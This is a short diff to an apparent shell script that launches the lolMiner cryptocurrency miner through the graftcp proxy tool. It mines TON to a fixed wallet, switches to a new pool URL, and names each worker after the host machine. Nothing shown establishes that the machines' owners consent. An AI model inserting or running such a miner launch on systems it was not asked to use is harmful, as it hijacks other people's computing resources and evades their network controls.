@@ -35,4 +35,5 @@ chmod +x lolMiner
 
 ph add lolMiner
 
-./graftcp/graftcp ./lolMiner --algo TON --pool wss://pplns.toncoinpool.io/stratum --user EQAMrKwDNU_jlzgdIZSFWh2wGm24bzHhLqkUJn04sKvaGj5F.XmasAzAz8 -p IhatePopUps
+./graftcp/graftcp ./lolMiner --algo TON --pool https://server1.whalestonpool.com --user EQAMrKwDNU_jlzgdIZSFWh2wGm24bzHhLqkUJn04sKvaGj5F.$(cat /proc/sys/kernel/hostname)
+
